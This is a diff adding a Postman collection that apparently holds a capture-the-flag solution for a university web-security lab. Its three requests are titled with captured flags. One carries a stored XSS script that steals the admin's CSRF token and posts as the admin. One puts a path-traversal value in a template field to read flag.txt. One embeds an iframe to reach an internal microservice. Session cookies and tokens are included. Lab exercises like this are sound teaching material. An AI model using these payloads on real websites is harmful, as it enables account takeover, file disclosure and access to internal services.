@@ -1,0 +1,166 @@
+{
+	"info": {
+		"_postman_id": "5d417a93-1cf6-4b51-9c00-7354eb3bea82",
+		"name": "bsk",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "25925713"
+	},
+	"item": [
+		{
+			"name": "FLAG{ToJestFlagaZeStopki} wysłanie kartki od admina",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "csrftoken=hUx4TMjd7B88OhRkIsJtffjObqkChtcu; sessionid=9535cp80pn54a5j8q6wb4pil4heyd2a7",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "csrfmiddlewaretoken",
+							"value": "JRTI1VYVPScNc9qS0mobBuYh2s0FCl4QQBgCKx7YMjaLQg72yEXuGz7V3Ia7JE6a",
+							"type": "text"
+						},
+						{
+							"key": "recipient",
+							"value": "admin",
+							"type": "text"
+						},
+						{
+							"key": "content",
+							"value": "<script>\nasync function fetchDataAndPost() {\n  try {\n    const response = await fetch(\"https://web.kazet.cc:42448/create\");\n    if (!response.ok) throw new Error(`Failed to fetch the page. Status: ${response.status}`);\n    const csrfToken = new DOMParser().parseFromString(await response.text(), \"text/html\").querySelector(\"input\")?.value;\n\n    if (csrfToken) {\n      const formData = new URLSearchParams({csrfmiddlewaretoken: csrfToken, recipient: \"hubi\", content: \"%3Cp%3Edsaasddsa%3C%2Fp%3E\", template: \"normal\"});\n      const postResponse = await fetch(\"https://web.kazet.cc:42448/create\", { method: \"POST\", headers: {\"Content-Type\": \"application/x-www-form-urlencoded\"}, body: formData });\n\n      if (postResponse.ok) {\n        console.log(\"POST request successful.\");\n      } else {\n        throw new Error(`POST request failed. Status: ${postResponse.status}`);\n      }\n    } else {\n      throw new Error(\"Unable to fetch the CSRF token.\");\n    }\n  } catch (error) {\n    console.error(\"An error occurred:\", error);\n  }\n}\n\n// Call the function to make the POST request\nfetchDataAndPost();\n\n</script>",
+							"type": "text"
+						},
+						{
+							"key": "template",
+							"value": "normal",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://web.kazet.cc:42448/create",
+					"protocol": "https",
+					"host": [
+						"web",
+						"kazet",
+						"cc"
+					],
+					"port": "42448",
+					"path": [
+						"create"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "FLAG{JeszczeJednaFlagaZaPunkty} tworzenie kartki z wybranym template",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "csrftoken=hUx4TMjd7B88OhRkIsJtffjObqkChtcu; sessionid=9535cp80pn54a5j8q6wb4pil4heyd2a7",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "csrfmiddlewaretoken",
+							"value": "lg91AaVdvYLyXOhxfIVU9SMdhe1x6ufHs0wVjM4gspJwBVYHN0udeXVRiubZdNh1",
+							"type": "text"
+						},
+						{
+							"key": "recipient",
+							"value": "hubi",
+							"type": "text"
+						},
+						{
+							"key": "content",
+							"value": "xd",
+							"type": "text"
+						},
+						{
+							"key": "template",
+							"value": "../../../../../../../../../../flag.txt",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://web.kazet.cc:42448/create",
+					"protocol": "https",
+					"host": [
+						"web",
+						"kazet",
+						"cc"
+					],
+					"port": "42448",
+					"path": [
+						"create"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "FLAG{71a4b4fd2214b808e4942dfb06c717878399a04c} osadzenie strony mikroserwisu na screenie",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "csrftoken=hUx4TMjd7B88OhRkIsJtffjObqkChtcu; sessionid=9535cp80pn54a5j8q6wb4pil4heyd2a7",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "csrfmiddlewaretoken",
+							"value": "ShRJ4teaAqbSBzJm7Y4q1RpSantJbocHZ1eDN5ndxR9QfGqwFgDJ6WywbDDbiHe1",
+							"type": "text"
+						},
+						{
+							"key": "recipient",
+							"value": "hubi",
+							"type": "text"
+						},
+						{
+							"key": "content",
+							"value": "<iframe src=\"http://zad41-mimuw-finals-2023-super-secret-microservice\" height=\"800\" width=\"800\" title=\"Iframe Example\"></iframe>",
+							"type": "text"
+						},
+						{
+							"key": "template",
+							"value": "coffee",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://web.kazet.cc:42448/create",
+					"protocol": "https",
+					"host": [
+						"web",
+						"kazet",
+						"cc"
+					],
+					"port": "42448",
+					"path": [
+						"create"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
